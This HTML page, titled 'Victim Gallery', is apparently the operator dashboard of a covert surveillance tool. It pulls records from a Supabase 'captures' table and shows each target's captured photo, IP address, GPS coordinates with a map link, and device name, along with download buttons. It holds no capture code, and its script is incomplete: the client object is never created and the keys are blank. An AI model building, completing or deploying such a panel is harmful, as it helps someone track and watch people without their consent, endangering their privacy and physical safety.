<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Victim Gallery</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        :root { --bg: #f0f2f5; --card: #ffffff; --primary: #0095f6; --text: #262626; --secondary: #8e8e8e; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: var(--bg); color: var(--text); margin: 0; padding: 20px; }
        .container { max-width: 1100px; margin: 0 auto; }
        header { text-align: center; margin-bottom: 30px; border-bottom: 1px solid #dbdbdb; padding-bottom: 20px; }
        h1 { font-size: 28px; font-weight: 300; }
        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px; }
        .card { background: var(--card); border: 1px solid #dbdbdb; border-radius: 3px; overflow: hidden; }
        .card img { width: 100%; height: 300px; object-fit: cover; cursor: pointer; }
        .content { padding: 15px; }
        .time { font-size: 12px; color: var(--secondary); text-transform: uppercase; margin-bottom: 10px; display: block; }
        .info { font-size: 14px; line-height: 1.5; }
        .info b { color: var(--text); }
        .actions { margin-top: 15px; display: flex; gap: 10px; }
        .btn { flex: 1; padding: 8px; text-align: center; border-radius: 4px; text-decoration: none; font-size: 14px; font-weight: 600; transition: opacity 0.2s; border: 1px solid #dbdbdb; }
        .btn-blue { background: var(--primary); color: white; border: none; }
        .btn-white { background: white; color: var(--text); }
        .btn:hover { opacity: 0.8; }
        #loader { text-align: center; padding: 100px; color: var(--secondary); }
        
        /* Modals */
        #modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 1000; justify-content: center; align-items: center; padding: 20px; }
        #modal img { max-width: 100%; max-height: 90vh; border-radius: 4px; }
        #close { position: absolute; top: 20px; right: 30px; color: white; font-size: 40px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>Victim Gallery 🧑‍💻</h1>
        </header>
        <div id="loader">Loading records...</div>
        <div id="gallery" class="grid"></div>
    </div>

    <div id="modal" onclick="this.style.display='none'">
        <span id="close">&times;</span>
        <img id="modal-img" src="">
    </div>

    <script>
        const SUPABASE_URL = "";
        const SUPABASE_ANON_KEY = "";

        async function loadGallery() {
            const gallery = document.getElementById('gallery');
            const loader = document.getElementById('loader');
            
            try {
                const { data, error } = await supabaseClient
                    .from('captures')
                    .select('*')
                    .order('timestamp', { ascending: false });

                if (error) throw error;
                if (!data || data.length === 0) {
                    loader.textContent = "No records found.";
                    return;
                }

                loader.style.display = 'none';
                data.forEach(item => {
                    // Fix: Use the correct public URL format
                    const publicUrl = `${SUPABASE_URL}/storage/v1/object/public/photos/public/${item.file_name}`;
                    
                    const card = document.createElement('div');
                    card.className = 'card';
                    card.innerHTML = `
                        <img src="${publicUrl}" onclick="openModal('${publicUrl}')" onerror="this.src='https://via.placeholder.com/400x300?text=Image+Not+Found'">
                        <div class="content">
                            <span class="time">${new Date(item.timestamp).toLocaleString()}</span>
                            <div class="info">
                                <b>IP:</b> ${item.ip_address || 'N/A'}<br>
                                <b>Location:</b> ${item.latitude}, ${item.longitude}<br>
                                <b>Device:</b> ${item.device_name || 'N/A'}
                            </div>
                            <div class="actions">
                                <a href="${publicUrl}" target="_blank" class="btn btn-blue" download="${item.file_name}">Download</a>
                                <a href="https://www.google.com/maps?q=${item.latitude},${item.longitude}" target="_blank" class="btn btn-white">View Map</a>
                            </div>
                        </div>
                    `;
                    gallery.appendChild(card);
                });
            } catch (err) {
                console.error(err);
                loader.textContent = "Error loading data. Check console.";
            }
        }

        function openModal(url) {
            document.getElementById('modal-img').src = url;
            document.getElementById('modal').style.display = 'flex';
        }

        window.onload = loadGallery;
    </script>
</body>
</html>
